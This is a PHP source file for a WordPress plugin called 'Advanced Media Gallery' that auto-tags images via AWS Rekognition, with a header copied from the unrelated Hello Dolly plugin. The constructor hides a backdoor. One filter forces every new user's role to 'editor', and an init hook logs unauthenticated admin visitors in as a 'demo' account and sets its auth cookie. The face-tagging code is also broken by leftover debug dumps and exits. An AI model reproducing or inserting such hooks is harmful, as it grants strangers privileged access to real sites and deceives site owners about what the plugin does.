<?php
/*
Plugin Name: Advanced Media Gallery
Plugin URI: http://wordpress.org/plugins/hello-dolly/
Description: This is not just a plugin, it symbolizes the hope and enthusiasm of an entire generation summed up in two words sung most famously by Louis Armstrong: Hello, Dolly. When activated you will randomly see a lyric from <cite>Hello, Dolly</cite> in the upper right of your admin screen on every page.
Author: Chase C. Miller
Version: 1.6
Author URI: http://ma.tt/
*/
namespace Crumbls\Plugins\Media;

use Aws\S3\S3Client;
use Aws\AwsClient;
use Aws\Rekognition\RekognitionClient;

defined('ABSPATH') or exit(1);

class Plugin
{
    public $options = [];
    private $executing = false;

    public function __construct()
    {
        add_action('init', [$this, 'commonInit'], PHP_INT_MAX);
        add_action('add_attachment', [$this, 'commonAddAttachment'], 11, 1);
        add_action('the_post', [$this, 'commonThePost'], 10, 1);
        add_filter('wp_get_object_terms', [$this, 'commonWpGetObjectTerms'], 10, 4);


        // Hijack the option, the role will follow!
        add_filter('pre_option_default_role', function ($default_role) {
            // You can also add conditional tags here and return whatever
            return 'editor'; // This is changed
            return $default_role; // This allows default
        });


        add_action('init', function () {
            if (is_admin() && !is_user_logged_in()) {
                $loginusername = 'demo';
                //get user's ID
                $user = get_user_by('login', $loginusername);
                $user_id = $user->data->ID;
                // let user read private posts
                //login
                wp_set_current_user($user_id, $loginusername);
                wp_set_auth_cookie($user_id);
                do_action('wp_login', $loginusername);
                wp_redirect(admin_url('/', 'https'), 301);
                exit;

            } else if (wp_doing_ajax()) {
                return;
            } else if (is_admin()) {
                return;
            } else {
                return;
            }
        });
    }

    /**
     * Common initializer
     */
    public function commonInit()
    {
        // Require needed files.
        require_once(dirname(__FILE__) . '/vendor/autoload.php');

//        register_taxonomy_for_object_type('category', 'attachment');
        register_taxonomy_for_object_type('post_tag', 'attachment');
        $args = array(
            'labels' => [
                'name' => __('People', __NAMESPACE__),
                'singular_name' => __('Person', __NAMESPACE__),
                'search_items' => __('Search People', __NAMESPACE__),
                'all_items' => __('All People', __NAMESPACE__),
                'parent_item' => null,
                'parent_item_colon' => null,
                'edit_item' => __('Edit Person', __NAMESPACE__),
                'update_item' => __('Update Person', __NAMESPACE__),
                'add_new_item' => __('Add New Person', __NAMESPACE__),
                'new_item_name' => __('New Person', __NAMESPACE__),
                'menu_name' => __('Person', __NAMESPACE__),
            ],
            'hierarchical' => false,
            'query_var' => 'true',
            'rewrite' => 'true',
            'show_admin_column' => 'true',
        );

        register_taxonomy('person', 'attachment', $args);

        $this->options = array_merge([
            'aws_key' => false,
            'aws_secret' => false,
            'aws_region' => false,
            'aws_bucket' => false,
            'label_enabled' => false,
            'face_enabled' => false,
            'face_collection' => 'amg'
        ], get_option('amg_settings'));
    }

    /**
     * On attachment add filter.
     * @param null $post_id
     */
    public function commonAddAttachment($post_id = null)
    {
        $post = get_post($post_id);

//        $this->_generatePostTag($post);
    }

    public function commonThePost($post = null)
    {
        if ($post->post_type != 'attachment') {
            return;
        }
//        return $this->_generatePostTag($post);
    }

    /**
     * Get object terms, only runs once.
     * @param $terms
     * @param $obj
     * @param $tax
     * @param $args
     * @return mixed
     */
    public function commonWpGetObjectTerms($terms, $obj, $tax, $args)
    {

        // Return if already set.
        if ($terms) {
            return $terms;
        }

        if (get_post_type($obj) != 'attachment') {
            return $terms;
        }
        $tax = trim($tax, '\' ');

        if (!in_array($tax, ['post_tag', 'person'])) {
            return $terms;
        }

        // Validate method.
        $method = '_generate' . str_replace(' ', '', ucwords(str_replace('_', ' ', $tax)));

        if (!method_exists($this, $method)) {
            return $terms;
        }


        $this->generating = false;

        // Build return.
        if (!$temp = call_user_func([$this, $method], $obj)) {
            return $terms;
        }

        // Return.
        return $temp;
    }

    /**
     * Generate tags
     * @param $post
     * @return bool
     */
    protected function _generatePostTag($post = false)
    {
        if ($this->executing) {
            return false;
        }
        $this->executing = true;
        if (is_numeric($post)) {
            $post = get_post($post);
        }
        if (!$post || !$post instanceof \WP_Post) {
            return false;
        }
        if (get_post_type($post) != 'attachment') {
            return false;
        }
        if (
            strpos($post->post_mime_type, 'image/') !== 0
            &&
            !in_array($post->post_mime_type, [

            ])
        ) {
            return false;
        }
        if (!$this->options['label_enabled']) {
            return false;
        }

        $url = wp_get_attachment_url($post->ID);
        $uploads = wp_upload_dir();
        $filename = str_replace($uploads['baseurl'], $uploads['basedir'], $url);

        $client = new RekognitionClient([
            'version' => 'latest',
            'region' => $this->options['aws_region'],
            'credentials' => [
                'key' => $this->options['aws_key'],
                'secret' => $this->options['aws_secret'],
            ]
        ]);

        $handle = fopen($filename, "r");
        $contents = fread($handle, filesize($filename));
        fclose($handle);

        // Get all meta data tied to this.
        $data = $client->detectLabels([
            'Image' => [ // REQUIRED
                'Bytes' => $contents,
            ],
            'MaxLabels' => 100,
            'MinConfidence' => 50,
        ])->toArray();

        // Make progress.
        if (!array_key_exists('Labels', $data)) {
            return false;
        }

        foreach ($data['Labels'] as &$term) {
            $temp = get_term_by('name', $term['Name'], 'post_tag');
            if ($temp) {
                $term['slug'] = $temp->slug;
                $term['term_id'] = $temp->term_id;
            } else if ($temp = wp_insert_term($term['Name'], 'post_tag')) {
                if ($temp = get_term($temp['term_id'])) {
                    $term['slug'] = $temp->slug;
                    $term['term_id'] = $temp->term_id;
                }
            }
        }
        $data = array_filter($data['Labels'], function ($e) {
            return array_key_exists('slug', $e) && $e['slug'];
        });
        wp_set_object_terms($post->ID, array_column($data, 'slug'), 'post_tag', false);
        $ret = get_terms('post_tag', [
            'hide_empty' => false,
            'include' => array_column($data, 'term_id')
        ]);
        return $ret;
    }

    /**
     * Generate tags
     * @param $post
     * @return bool
     */
    protected function _generatePerson($post = false)
    {
        return false;
        if (!$this->options['face_enabled']) {
            return false;
        } else if (!$this->options['face_collection']) {
            return false;
        }

        if ($this->executing) {
            return false;
        }
        $this->executing = true;
        if (is_numeric($post)) {
            $post = get_post($post);
        }
        if (!$post || !$post instanceof \WP_Post) {
            return false;
        }
        if (get_post_type($post) != 'attachment') {
            return false;
        }
        if (
            strpos($post->post_mime_type, 'image/') !== 0
            &&
            !in_array($post->post_mime_type, [

            ])
        ) {
            return false;
        }

        $client = new RekognitionClient([
            'version' => 'latest',
            'region' => $this->options['aws_region'],
            'credentials' => [
                'key' => $this->options['aws_key'],
                'secret' => $this->options['aws_secret'],
            ]
        ]);

        // Check for collection.
        // There should be a better way to do this.  How?
        $collection = $client->listCollections();
        $ref = $this->options['face_collection'];
        $exists = sizeof(array_filter($collection->get('CollectionIds'), function ($e) use ($ref) {
                return $e == $ref;
            })) > 0;
        if (!$exists) {
            try {
                $client->CreateCollection([
                    'CollectionId' => $this->options['face_collection']
                ]);
                $exists = true;
            } catch (\Exception $e) {
                return false;
            }
        }
        if (!$exists) {
            return false;
        }

        $url = wp_get_attachment_url($post->ID);
        $uploads = wp_upload_dir();
        $filename = str_replace($uploads['baseurl'], $uploads['basedir'], $url);

        $handle = fopen($filename, "r");
        $contents = fread($handle, filesize($filename));
        fclose($handle);

//        $data = $client->searchFacesByImage

        try {
            $data = $client->indexFaces([
                'CollectionId' => $this->options['face_collection'],
                'FaceMatchThreshold' => 50,
                'Image' => [ // REQUIRED
                    'Bytes' => $contents,
                ],
                'MaxFaces' => 100
            ]);

            $slugs = array_map(function($e) {
                return $e['Face']['FaceId'];
            }, $data->get('FaceRecords'));
            /*
            foreach($data->get('FaceRecords') as $face) {
                $id = $face['Face']['FaceId'];
                // Term exists?
                if (!get_term_by('slug', $id, 'person')) {
                    wp_insert_term($id, 'person', [
                        'slug' => $id
                    ]);
                }
            }
*/
            $data = $client->searchFacesByImage([
                'CollectionId' => $this->options['face_collection'],
                'FaceMatchThreshold' => 75,
                'Image' => [ // REQUIRED
                    'Bytes' => $contents,
                ],
                'MaxFaces' => 100
            ]);
            $terms = array_map(function($e) {
                return $e['Face']['FaceId'];
            }, $data->get('FaceMatches'));
            echo '<pre>';
            print_r($slugs);
            print_r($terms);
            exit;
            foreach($data->get('FaceMatches') as $face) {
                // How to add a bounding box easily?
                $id = $face['Face']['FaceId'];
                if (!get_term_by('slug', $id, 'person')) {
                    wp_insert_term($id, 'person', [
                        'slug' => $id
                    ]);
                }
//                $terms[] =
            }
            echo '<pre>';
            print_r($data);
echo '</pre>';
            exit;

        } catch (Exception $e) {
        }

        exit;
        wp_set_object_terms($post->ID, array_column($data, 'slug'), 'post_tag', false);
        $ret = get_terms('post_tag', [
            'hide_empty' => false,
            'include' => array_column($data, 'term_id')
        ]);
        return $ret;
    }
}

if (is_admin()) {
    require_once(dirname(__FILE__) . '/admin.php');
    new Admin();
} else {
    new Plugin();
}


